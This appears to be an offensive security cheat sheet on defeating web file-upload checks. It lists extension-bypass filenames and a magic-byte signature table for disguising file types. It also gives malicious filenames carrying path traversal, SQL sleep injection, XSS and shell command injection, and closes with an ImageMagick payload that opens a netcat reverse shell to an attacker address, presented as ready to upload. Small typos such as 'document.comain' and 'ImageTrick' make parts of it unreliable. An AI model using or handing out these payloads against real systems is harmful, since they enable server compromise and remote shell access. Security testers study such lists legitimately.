# File Upload

## Evade file restrictions

Changing the content type header when trying to upload reverse shells can bypass simple files detection systems.

These strings are effective in evading file upload checks only if the server does not check the actual file signature but checks only the extension.

```php
file.png.php
file.png.Php5
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
file.png.jpg.php
file.php%00.png%00.jpg
```

### Magic bytes

To bypass file control insert the following bytes sequences at the beginning of the file to change its type and edit file extension accordingly.

```php
python -c "print '<signature>'" > <file>
#hex signature example: \x4D\x5A
```

| File type                       | Mnemonic            | Signature                                    |
| ------------------------------- | ------------------- | -------------------------------------------- |
| DOS executable                  | "MZ"&#xD;           | 0x4D 0x5A&#xD;                               |
| PE32 executable                 | "MZ"...."PE.."&#xD; | 0x4D 0x5A ... 0x50 0x45 0x00 0x00&#xD;       |
| Mach-O Executable (32 bit)      | "FEEDFACE"&#xD;     | 0xFE 0xED 0xFA 0xCE&#xD;                     |
| Mach-O Executable (64 bit)&#xD; | "FEEDFACF"&#xD;     | 0xFE 0xED 0xFA 0xCF&#xD;                     |
| ELF Executable&#xD;             | ".ELF"&#xD;         | 0x7F 0x45 0x4C 0x46&#xD;                     |
| Zip Archive&#xD;                | "PK.."&#xD;         | 0x50 0x4B 0x03 0x04&#xD;                     |
| Rar Archive&#xD;                | "Rar!...."&#xD;     | 0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00&#xD; |
| Ogg Container&#xD;              | "OggS"&#xD;         | 0x4F 0x67 0x67 0x53&#xD;                     |
| Matroska/EBML Container&#xD;    | N/A                 | 0x45 0x1A 0xA3 0xDF&#xD;                     |
| PNG Image&#xD;                  | ".PNG...."&#xD;     | 0x89 0x50 0x4E 0x47 0x0D 0x0A 0x1A 0x0A&#xD; |
| BMP Image&#xD;                  | "BM"&#xD;           | 0x42 0x4D&#xD;                               |
| GIF Image&#xD;                  | "GIF87a"&#xD;       | 0x47 0x49 0x46 0x38 0x37 0x61&#xD;           |
| GIF Image&#xD;                  | "GIF89a"&#xD;       | 0x47 0x49 0x46 0x38 0x39 0x61                |

## Malicious filenames

```
../../../tmp/lol.png 
sleep(10)-- -.jpg 
<svg onload=alert(document.comain)> 
; sleep 10;
```

## ImageTrick vulnerability

Save this code snippet in a text file and upload it to receive a reverse shell

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|nc -e /bin/sh <IP> "<PORT>)'
pop graphic-context
```

